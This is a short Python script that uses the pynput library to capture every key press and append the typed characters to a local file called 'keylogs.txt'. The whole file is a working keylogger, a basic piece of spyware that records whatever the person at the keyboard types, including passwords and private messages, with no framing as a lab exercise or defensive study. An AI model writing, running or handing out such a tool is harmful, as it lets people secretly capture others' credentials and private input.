from pynput import keyboard


def KeyPressed(key):
    print(str(key))
    with open("keylogs.txt", 'a') as Keylog:  # 'a' appends the attained data into the file 'keylogs.txt'

     try:
      char = key.char
      Keylog.write(char)
     except:
      print("There's an error OR the Backspace, Enter, Shift, Spacebar, etc was clicked.")


if __name__ == "__main__":
 listener = keyboard.Listener(on_press=KeyPressed)
 listener.start()
 input()
